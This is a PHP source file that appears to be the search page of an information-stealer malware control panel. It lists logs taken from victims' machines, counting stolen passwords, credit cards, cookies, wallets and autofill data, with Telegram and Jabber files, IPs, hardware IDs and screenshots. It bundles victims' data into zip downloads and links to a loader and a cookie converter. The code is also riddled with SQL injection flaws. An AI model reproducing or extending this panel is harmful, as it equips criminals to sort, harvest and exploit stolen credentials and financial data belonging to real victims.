<?php 
   session_start();
   include 'database.php';
	require_once("auth.php");
  if(isset($_GET['p'])){
	   $p = formatString($_GET["p"]);
   
   if (strlen($p) > 6) {
       header("Location: index.php", true, 301);
       die();
   }
   if ($p === "") {
       $p = 1;
   }
   
   if ($p != null) {
       $next = $p + 1;
       if ($p != 1) {
           $past = $p - 1;
       }
   }} else {
       $p = 1;
       $next = 2;
       $past = null;
   }

   if(isset($_GET["download"])) $download = formatString($_GET["download"]);
   if(isset($_GET["check"])) $check = formatString($_GET["check"]);
   if(isset($_GET["delete"])) $delete = formatString($_GET["delete"]);
   if(isset($_GET["comment"])) $comment = formatString($_GET["comment"]);
   if($comment!=null){
	   $id = formatString($_GET['id']);
	   $pdoConnection->query("UPDATE `logs` SET `comment` = '$comment' WHERE `id` = '$id'");
	   header("Location: search.php", true, 301);
   }
   if ($download != null) {
  if(strpos($download,',')!==false){
		$ids = explode(',',$download);
		   $txt    = "logs/".(count($ids)-1) ." Logs ". date("d.m.Y_H:i:s") . ".zip";
        $zipAll = new ZipArchive();
        $zipAll->open($txt, ZipArchive::CREATE | ZipArchive::OVERWRITE);
        for($i=0;$i<count($ids)-1;$i++){
			$pc = $pdoConnection->query("SELECT hwid, ip, country, date FROM `logs` WHERE `id`=".$ids[$i])->fetch(PDO::FETCH_ASSOC);
            $rootPath = realpath("logs/" . $pc["hwid"] . "/");
			if(file_exists($rootPath)){
            $files    = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($rootPath), RecursiveIteratorIterator::LEAVES_ONLY);
            
            foreach ($files as $name => $file) {
                if (!$file->isDir()) {
                    $filePath     = $file->getRealPath();
                    $str          = date("d.m.Y_H:i:s", $pc["date"]) . "_" . $pc["country"] . "_" . $pc["ip"] . "_" . $pc["hwid"];
					$relativePath = substr($filePath, strlen($rootPath) + 1);
					$zipAll->addFile($filePath, $str . "/" . $relativePath);
                }
            }
            $pdoConnection->query("UPDATE `logs` SET `checked` = 1 WHERE `hwid` = '" . $pc["hwid"]."'");
			}
        }
        $zipAll->close();
        header("Location: " . $txt);
	   }else{
       $hwid = $pdoConnection->query("SELECT hwid FROM `logs` WHERE id = '" . $download . "'")->fetchColumn(0);
       $ip = $pdoConnection->query("SELECT ip FROM `logs` WHERE id = '" . $download . "'")->fetchColumn(0);
$country = $pdoConnection->query("SELECT country FROM `logs` WHERE id = '" . $download . "'")->fetchColumn(0);
		$datee = $pdoConnection->query("SELECT date FROM `logs` WHERE id = '" . $download . "'")->fetchColumn(0);
		$str          = date("d.m.Y_H:i:s", $datee) . "_" . $country . "_" . $ip . "_" . $hwid;
       $txt = "logs/" .$str. ".zip";
       $rootPath = realpath("logs/" . $hwid . "/");
       $zip = new ZipArchive();
       $zip->open($txt, ZipArchive::CREATE | ZipArchive::OVERWRITE);
       $zip->setArchiveComment(file_get_contents("logs/" . $hwid . "/information.log"));
   
       $files = new RecursiveIteratorIterator(
           new RecursiveDirectoryIterator($rootPath),
           RecursiveIteratorIterator::LEAVES_ONLY
       );
   
       foreach ($files as $name => $file) {
           if (!$file->isDir()) {
               $filePath = $file->getRealPath();
               
				$relativePath = substr($filePath, strlen($rootPath) + 1);
				$zip->addFile($filePath,$relativePath);
           }
       }
   
   
       $zip->close();
	   $pdoConnection->query("UPDATE `logs` SET `checked` = '1' WHERE `hwid` = '$hwid'");
       header("Location: ". $txt);   
       exit;
	   }
   }
   if ($delete != null) {
       if(strpos($delete,',')!==false){
		   $ids = explode(',',$delete);
		   for($i=0;$i<count($ids)-2;$i++){
			   try{
		   $hwid = $pdoConnection->query("SELECT hwid FROM `logs` WHERE id = '" . formatString($ids[$i]) . "'")->fetchColumn(0);
           $dir = "logs/" . $hwid . "/";
		   if(strlen($dir)>6){
           $it = new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS);
           $files = new RecursiveIteratorIterator($it,
               RecursiveIteratorIterator::CHILD_FIRST);
           foreach ($files as $file) {
               if ($file->isDir()) {
                   rmdir($file->getRealPath());
               } else {
                   unlink($file->getRealPath());
               }
           }
           rmdir($dir);  
		   }
       } catch (Exception $ex) {
       }
       $pdoConnection->exec("DELETE FROM `logs` WHERE id = '" . $ids[$i] . "'");
		   }
	   }else{
       try {  
           $hwid = $pdoConnection->query("SELECT hwid FROM `logs` WHERE id = '" . formatString($delete) . "'")->fetchColumn(0);
           $dir = "logs/" . $hwid . "/";
		   if(strlen($dir)>6){
           $it = new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS);
           $files = new RecursiveIteratorIterator($it,
               RecursiveIteratorIterator::CHILD_FIRST);
           foreach ($files as $file) {
               if ($file->isDir()) {
                   rmdir($file->getRealPath());
               } else {
                   unlink($file->getRealPath());
               }
           }
           rmdir($dir);  
		   }
       } catch (Exception $ex) {
       }
       $pdoConnection->exec("DELETE FROM `logs` WHERE id = '" . $delete . "'");
	   }
	   header("Location: search.php", true, 301);
   }
   
   if ($check != null) {
       $pdoConnection->exec("UPDATE `logs` SET checked = 1 WHERE id = '" . $check . "'");
   }
if(isset($_GET["search_type"])) $search_type = formatString($_GET["search_type"]); 			else $search_type=false;
if(isset($_GET["search_pass"])) $search_pass = formatString($_GET["search_pass"]);			else $search_pass=false;
if(isset($_GET["search_cookie"])) $search_cookie = formatString($_GET["search_cookie"]);		else $search_cookie=false;
if(isset($_GET["search_wallet"])) $search_wallet = formatString($_GET["search_wallet"]);		else $search_wallet=false;
if(isset($_GET["search_comment"])) $search_comment = formatString($_GET["search_comment"]);			else $search_commet=false;
if(isset($_GET["search_country"])) $search_country = formatString($_GET["search_country"]);	else $search_country=false;
if(isset($_GET["search_in_passwords"])) $parser_link = formatString($_GET["search_in_passwords"]); else $parser_link=false;
if(isset($_GET["search_in_cookies"])) $parser_cookie = formatString($_GET["search_in_cookies"]); else $parser_cookie=false;
if(isset($_GET["search_cc"])) $search_cc = formatString($_GET["search_cc"]); else $search_cc=false;
if(isset($_GET["search_jabb"])) $search_jabb = formatString($_GET["search_jabb"]); else $search_jabb=false;
if(isset($_GET["search_tg"])) $search_tg = formatString($_GET["search_tg"]); else $search_tg=false;
if(isset($_GET["search_unchecked"])) $search_unchecked = formatString($_GET["search_unchecked"]); else $search_unchecked=false;
$filter_pass = "";
$filter_comment = "";
$filter_cookie = "";
//$filter_type = "";
$filter_wallet = "";
$filter_country = "";
$filter_unchecked = "";
//if($search_type) {$filter_type = "`type` LIKE '%$search_type%'"; if($search_type=="All")$filter_type = " 1=1 ";}
if($search_pass=="on") $filter_pass = " AND `pswd`>0 ";
if($search_cookie=="on") $filter_cookie = " AND `cookie`>0 ";
if($search_wallet=="on") $filter_wallet = " AND `wallets`>0 ";
if($search_cc=="on") $filter_cc = " AND `credit`>0 ";
if($search_country) $filter_country = " AND `country` LIKE '%$search_country%' ";
if($search_comment) $filter_comment = " AND `comment` LIKE '%$search_comment%' ";
if($search_unchecked) $filter_unchecked = " AND `checked` = '0' ";
if(isset($_GET['action']))
	if($_GET['action']=="search")
		   if ($p) {
			   $bots = $pdoConnection->query("SELECT * FROM `logs` WHERE 1=1 $filter_pass $filter_cookie $filter_wallet $filter_cc $filter_comment $filter_country $filter_unchecked ORDER BY `id` DESC LIMIT " . $past . "00, 100")->fetchAll(PDO::FETCH_ASSOC);
       //$bots = $pdoConnection->query('SELECT * FROM `logs` ORDER BY `id` DESC LIMIT ' . $d . '00, ' . $p . '00')->fetchAll(PDO::FETCH_ASSOC);
   } else {
      $bots = $pdoConnection->query("SELECT * FROM `logs` WHERE $filter_type $filter_pass $filter_cookie $filter_wallet $filter_comment $filter_country $filter_unchecked ORDER BY `id` DESC LIMIT 100")->fetchAll(PDO::FETCH_ASSOC);
   }
  function formatString($param)
   {
       $returnString = $param;
       $returnString = trim($returnString);
       $returnString = stripslashes($returnString);
       $returnString = htmlspecialchars($returnString);
   
       return $returnString;
   }
   
   ?>
<!DOCTYPE html>
<html lang="en">
   <head>
      <meta charset="utf-8"/>
      <title>Search</title>
      <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
      <link href="assets/css/bootstrap.min.css" rel="stylesheet" type="text/css"/>
	  <link href="assets/css/switch.css" rel="stylesheet" type="text/css"/>
      <link href="https://use.fontawesome.com/releases/v5.6.3/css/all.css" rel="stylesheet" type="text/css"/>
      <link href="https://cdnjs.cloudflare.com/ajax/libs/viewerjs/1.3.1/viewer.css" rel="stylesheet" type="text/css"/>
      <link href="assets/css/app.min.css" rel="stylesheet" type="text/css"/>
   </head>
   <header id="topnav">
      <div class="topbar-menu">
         <div class="container-fluid">
            <div id="navigation">
               <ul class="navigation-menu">
                  <li>
                     <a href="index.php">
                     <i class="fas fa-hashtag"></i>Dashboard</a>
                  </li>
                  <li>
                     <a href="loader.php">
                     <i class="fas fa-tasks"></i>Loader</a>
                  </li>
                  <li>
                     <a href="converter.php">
                     <i class="fas fa-arrows-alt-h"></i>Cookies Converter</a>
                  </li>
				  <li>
                     <a href="search.php">
                     <i class="fas fa-search"></i>Search</a>
                  </li>
				  <li>
                     <a href="settings.php">
                     <i class="fas fa-cogs"></i>Settings</a>
                  </li>
               </ul>
               <div class="clearfix"></div>
            </div>
         </div>
      </div>
   </header>
   <div class="wrapper">
      <div class="container-fluid">
            <div class="col-12">
               <div class="card widget-flat">
                  <div class="card-body p-0">
                     <div class="p-3 pb-0">
					 <div>
                        <form method="GET">
						<div class="form-group row">
                                        <label class="col-sm-2 col-form-label">Type</label>
                                        <div class="col-sm-10">
                                            <select class="form-control" name="search_type">
											<option value="all" selected>All</option>
											<?php
											$presets = $pdoConnection->query("SELECT * FROM `presets`");
											while ($preset = $presets->fetch(PDO::FETCH_ASSOC))
											{
												echo '<option value="'.$preset["name"].'">'.$preset["name"]."</option>";
											}
											?>
											</select>
                                        </div>
                        </div>				
						<div class="form-group row">
                                        <label class="col-sm-2 col-form-label">Country</label>
                                        <div class="col-sm-10">
                                            <input class="form-control" value="<?php echo $search_country;?>" name="search_country" type="text">
                                        </div>
                                    </div>		
									<div class="form-group row">
                                        <label class="col-sm-2 col-form-label">Comment</label>
                                        <div class="col-sm-10">
                                            <input class="form-control"  value="<?php echo $search_comment;?>" name="search_comment" type="text">
                                        </div>
                                    </div>
									<div class="form-group row">
                                        <label class="col-sm-2 col-form-label">Search link in passwords</label>
                                        <div class="col-sm-10">
                                            <input class="form-control" value="<?php echo $search_in_passwords;?>" name="search_in_passwords" type="text">
                                        </div>
                                    </div>	
									<div class="form-group row">
                                        <label class="col-sm-2 col-form-label">Search link in cookies</label>
                                        <div class="col-sm-10">
                                            <input class="form-control"  value="<?php echo $search_in_cookies;?>" name="search_in_cookies" type="text">
                                        </div>
                                    </div>	
									<div class = "collumn">
									<div class="form-group row x300">
                                        <label class="col-sm-2 col-form-label">With passwords</label>
                                        <label class="switch">
										  <input type="checkbox" name="search_pass">
										  <span class="slider round"></span>
										</label>
                                    </div>
									<div class="form-group row x300">
                                        <label class="col-sm-2 col-form-label">With cookies</label>
                                        <label class="switch">
										  <input type="checkbox" name="search_cookie">
										  <span class="slider round"></span>
										</label>
                                    </div>
									<div class="form-group row x300">
                                        <label class="col-sm-2 col-form-label">With wallets</label>
                                        <label class="switch">
										  <input type="checkbox" name="search_wallet">
										  <span class="slider round"></span>
										</label>
                                    </div>
									<div class="form-group row x300">
                                        <label class="col-sm-2 col-form-label">With CC</label>
                                        <label class="switch">
										  <input type="checkbox" name="search_cc">
										  <span class="slider round"></span>
										</label>
                                    </div></div>
									<div class = "collumn">
									<div class="form-group row x300">
                                        <label class="col-sm-2 col-form-label">With Jabber</label>
                                        <label class="switch">
										  <input type="checkbox" name="search_jabb">
										  <span class="slider round"></span>
										</label>
                                    </div>
									<div class="form-group row x300">
                                        <label class="col-sm-2 col-form-label">With Telegram</label>
                                        <label class="switch">
										  <input type="checkbox" name="search_tg">
										  <span class="slider round"></span>
										</label>
                                    </div>
									<div class="form-group row x300">
                                        <label class="col-sm-2 col-form-label">Unchecked</label>
                                        <label class="switch">
										  <input type="checkbox" name="search_unchecked">
										  <span class="slider round"></span>
										</label>
                                    </div>
									</div>
							<input name="action" type="hidden" value="search">
							<div class="buttonsBlock">
							<center>
							<button type="submit" class="btn btn-secondary btn-sm">Search</button></center></div>
								</form>
						</div>
                     </div>
                  </div>
               </div>
            </div>
            <div class="col-12">
               <div class="card">
                  <div class="card-body">
					<div style = "padding-bottom: 1rem;">
						<center>
						<button onclick = "SelectDeselectAll()" class="btn btn-info btn-sm">Invert selection</button>
						<a id="chkbxdown" href="index.php" class="btn btn-info btn-sm">Download</a>
						<a id="chkbx" href="index.php" class="btn btn-info btn-sm">Delete</a>
						</center>
					</div>
                        <div class="table-responsive mt-3" id='logs'>
                           <table class="table table-hover table-centered mb-0">
                              <thead>
                                 <tr>
									<th></th>
                                    <th style="width: 25%;">Stats</th>
                                    <th>HWID/System</th>
                                    <th>Network</th>
                                    <th>Date</th>
                                    <th>Version</th>
                                    <th>Screen</th>
									<th>ID</th>
									<th>Comment</th>
                                    <th>Actions</th>
                                 </tr>
                              </thead>
                              <tbody>
                                 <?php 
								 $i=0;
                                    foreach($bots as $bot) {
										if($search_jabb=="on"){
											$fname = "logs/" . $bot["hwid"] . "/jabber";
											if (!file_exists($fname)) continue;
										}
										if($search_tg=="on"){
											$fname = "logs/" . $bot["hwid"] . "/Telegram";
											if (!file_exists($fname)) continue;
										}
										
										if($parser_link!==""){
											$fname = "logs/" . $bot["hwid"] . "/"."passwords.log";
											if (!file_exists($fname)) continue;
											if (strripos(file_get_contents($fname), $parser_link)===false) continue;
										}
										if($parser_cookie!==""){
											$fname = "logs/" . $bot["hwid"] . "/"."cookieDomains.log";
											if (!file_exists($fname)) continue;
											if (strripos(file_get_contents($fname), $parser_cookie)===false) continue;
										}
										if($search_type!==false){
											$presetKey='';
											$b=0;
											if($search_type!=="all"){
											$presetsArray = $pdoConnection->query("SELECT id,color,pattern,name FROM `presets` WHERE name='$search_type'")->fetch();
											$siteFinded = explode(";",$presetsArray['pattern']);
											foreach($siteFinded as $key){
												if(file_exists("logs/" . $bot["hwid"] . "/" . "passwords.log")){
												if (strripos(file_get_contents("logs/" . $bot["hwid"] . "/" . "passwords.log"), $key)!==false) {
												if($b==0){$presetKey.='<br><br>';$b++;}
												$presetKey.='<small><span style="display:inline;color:'.$presetsArray[1].';"><i
												class="fas fa-key"></i>'.$key.'&nbsp;</span></small>';
												}
												}
												if(file_exists("logs/" . $bot["hwid"] . "/" . "cookieDomains.log")){
												if (strripos(file_get_contents("logs/" . $bot["hwid"] . "/" . "cookieDomains.log"), $key)!==false) {
												if($b==0){$presetKey.='<br><br>';$b++;}
												$presetKey.='<small><span style="display:inline;color:'.$presetsArray[1].';"><i
												class="fas fa-cookie"></i>'.$key.'&nbsp;</span></small>';
												}
												}
											}
											if($presetKey=='') continue;
										 	}else{
											$presetsArray = $pdoConnection->query("SELECT id,color,pattern,name FROM `presets`");
											while($presetArray=$presetsArray->fetch()){
											$siteFinded = explode(";",$presetArray[2]);
											foreach($siteFinded as $key){
											if(file_exists("logs/" . $bot["hwid"] . "/" . "passwords.log")){
												if (strripos(file_get_contents("logs/" . $bot["hwid"] . "/" . "passwords.log"), $key)!==false) {
												if($b==0){$presetKey.='<br><br>';$b++;}
												$presetKey.='<small><span style="display:inline;color:'.$presetArray[1].';"><i
												class="fas fa-key"></i>'.$key.'&nbsp;</span></small>';
												}
												}
												if(file_exists("logs/" . $bot["hwid"] . "/" . "cookieDomains.log")){
												if (strripos(file_get_contents("logs/" . $bot["hwid"] . "/" . "cookieDomains.log"), $key)!==false) {
												if($b==0){$presetKey.='<br><br>';$b++;}
												$presetKey.='<small><span style="display:inline;color:'.$presetArray[1].';"><i
												class="fas fa-cookie"></i>'.$key.'&nbsp;</span></small>';
												}
												}
										 }
										 }
										}
										}
										$i++;
                                        ?>
                                  <tr id="<?php  echo $bot['id'];?>table"onclick="toggleCheckbox(<?php  echo $bot['id'];?>)">
								 <input class="invcheckbox" style="display:none" type="checkbox" id="<?php  echo $bot['id'];?>"></input>
									<td><?php  if($bot['checked']=="1"){
										echo '<span style = "padding-left: 3px;padding-right: 3px;" class = "fas fa-check-square btn btn-success btn-sm" ></span>';
									}else{
										echo '<span style = "padding-left: 3px;padding-right: 3px;" class = "fas fa-minus-square btn btn-danger btn-sm" ></span>';
									}
									?></td>	
									<td>
                                       <span style="display: inline;"><i
                                          class="fas fa-key"></i><b><?php  echo $bot["pswd"]; ?> </b></span>
                                       <span style="display: inline;"><i
                                          class="fas fa-credit-card"></i><b> <?php  echo $bot["credit"]; ?></b> </span>
                                       <span style="display: inline;"><i class="fas fa-cookie"></i></i>
                                       <b> <?php  echo $bot["cookie"]; ?> </b></span>
                                       <span style="display: inline;"><i class="fas fa-clipboard-list"></i></i>
                                       <b> <?php  echo $bot["autofill"]; ?> </b></span>
                                       <span style="display: inline;"><i class="fas fa-wallet"></i></i>
                                       <b><?php  echo $bot["wallets"]; ?> </b></span>
                                       <span style="display: inline;"><i class="fas fa-file"></i></i>
                                       <b> <?php  echo $bot["count"]; ?> </b></span>
									   <?php 
										echo $presetKey;
										?>
                                    </td>
                                    <td><b><?php  echo $bot["hwid"]; ?></b><br>
                                       <small class="u-block u-text-mute"><?php  echo $bot["system"]; ?></small>
                                    </td>
                                    <td><b><?php  echo $bot["ip"]; ?></b><br>
                                       <small class="u-block u-text-mute"><?php  echo $bot["country"]; ?></small>
                                    </td>
                                    <td><b><?php  echo date("d/m/Y H:i:s",$bot["date"]);											?></b></td>
                                    <td><b><?php  echo $bot["buildversion"]; ?></b></td>
                                    <td><img height="45" width="75"
                                       src=<?php  echo "logs/" . $bot["hwid"] . "/screen.jpeg"; ?>></td>
									    <td><?php 
									echo "<button type=\"button\" class=\"btn btn-secondary btn-sm\">".$bot['userID']."</button>"; ?></td>
                                    <td>
									   <td>
									   <form>
									   <div class="input-group">
											<input type="hidden" name="id" value="<?php echo $bot['id'];?>">
											<input name = "comment" type="text" value="<?php echo $bot['comment'];?>" class="form-control"></input>
											<button type="submit" class="btn btn-success btn-sm">
											<span class="fas fa-save"></span></button>
										</div> 
										</form>
									   </td>
                                    <td>
                                       <div class="btn-group">
                                          <button type="button" class="btn btn-info dropdown-toggle btn-sm"
                                             data-toggle="dropdown" aria-haspopup="true"
                                             aria-expanded="false">Actions
                                          </button>
                                          <div class="dropdown-menu">
                                             <a class="dropdown-item" href="search.php?download=<?php  echo $bot["id"]; ?>">Download</a>
											  <a class="dropdown-item" target="_blank" href="viewer.php?passwords=<?php  echo $bot["id"]; ?>">View passwords</a>
											   <a class="dropdown-item" target="_blank" href="viewer.php?browsers=<?php  echo $bot["id"]; ?>">View browsers</a>
											 <a class="dropdown-item" href="search.php?check=<?php  echo $bot["id"]; ?>">Mark as checked</a>
                                             <a class="dropdown-item" href="search.php?delete=<?php  echo $bot["id"]; ?>">Delete</a>
                                          </div>
                                       </div>
                                    </td>
                                 </tr>
                                    <?php 
                                    }
									echo "<center><a href='#'>Printed $i logs</a></center>";
                                    ?>
                              </tbody>
                           </table>
                        </div>
						<nav style="margin-top: 10px;">
                        <ul class="pagination mx-auto justify-content-center">
                           <li class="page-item">
                              <a class="page-link" href="search.php?p=<?php  echo $past;echo "&".$_SERVER['QUERY_STRING']; ?>">
                              <span>Previous</span>
                              </a>
                           </li>
                           <?php 
                              if ($p != "") {
                                  if ($p != "1") {
                                      ?>
                           <li class="page-item"><a class="page-link"
                              href="search.php?<?php echo "&".$_SERVER['QUERY_STRING'];echo "&p=".($p - 1); ?>"><?php  echo $p - 1; ?></a>
                           </li>
                           <?php 
                              }
                              }
                              
                              ?>
                           <li class="page-item"><a class="page-link" href="#"><?php  if ($p == null) {
                              echo "1";
                              } else {
                              echo $p;
                              } ?></a></li>
                           <li class="page-item"><a class="page-link"
                              href="search.php?<?php echo $_SERVER['QUERY_STRING'];echo "&p=".($p+1); ?>"><?php  echo $p + 1; ?></a>
                           </li>
                           <li class="page-item">
                              <a class="page-link" href="search.php?<?php echo "&".$_SERVER['QUERY_STRING'];echo "&p=".($next); ?>">
                              <span>Next</span>
                              </a>
                           </li>
                        </ul>
                     </nav>
                  </div>
               </div>
            </div>
         </div>
      </div>
   </div>
   </div>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/viewerjs/1.3.1/viewer.min.js"></script>
   <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js"
      integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo"
      crossorigin="anonymous"></script>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js"
      integrity="sha384-wHAiFfRlMFy6i5SRaxvfOCifBUQy1xHdJ/yoi7FRNXMRBu5WHdZYu1hA6ZOblgut"
      crossorigin="anonymous"></script>
   <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/js/bootstrap.min.js"
      integrity="sha384-B0UglyR+jN6CkvvICOB2joaf5I4l3gm9GU6Hc1og6Ls7i6U/mkkaduKaBhlAXv9k"
      crossorigin="anonymous"></script>
	  	  <script>
	  function toggleCheckbox(id)
		 {
		var element = document.getElementById(id);
		   element.checked = !element.checked;
		   blink(element);
		   var logs = "";
		var checkboxes = document.getElementsByClassName('invcheckbox');
		for (var index = 0; index < checkboxes.length; index++)
		{
			 if (checkboxes[index].checked)
			 {
				logs = logs + "" + checkboxes[index].id + ",";
			 }
		  }
		  document.getElementById('chkbxdown').href="search.php?download="+logs;
		  document.getElementById('chkbx').href="search.php?delete="+logs;
		 }
		 function SelectDeselectAll(id)
		 {
		var checkboxes = document.getElementsByClassName('invcheckbox');
		var logs="";
		for (var index = 0; index < checkboxes.length; index++)
		{
			checkboxes[index].checked = !checkboxes[index].checked;
			if(checkboxes[index].checked) logs = logs + "" + checkboxes[index].id + ",";
			blink(checkboxes[index]);
		  }
		  document.getElementById('chkbxdown').href="search.php?download="+logs;
		  document.getElementById('chkbx').href="search.php?delete="+logs;
		 }
		  function blink(elem)
		 {
			var checkbox = elem;
			var table = document.getElementById(elem.id+'table');
			if(checkbox.checked){
				table.style.backgroundColor='aliceblue';
			}else{
				table.style.backgroundColor='';
			}
		 }
	  </script>
   <script>
      var inputs = document.getElementsByTagName('img');
      
      for (var i = 0; i < inputs.length; i++) {
          var viewer = new Viewer(inputs[i],
              {
                  inline: false,
                  button: false,
                  navbar: false,
                  title: false,
                  toolbar: false,
                  tooltip: false,
                  movable: false,
                  zoomable: false,
                  rotatable: false,
                  scalable: false,
                  transition: false,
                  fullscreen: false,
                  keyboard: true,
                  loop: true,
                  loading: true,
                  backdrop: true
              });
      }
      
      
   </script>
</html>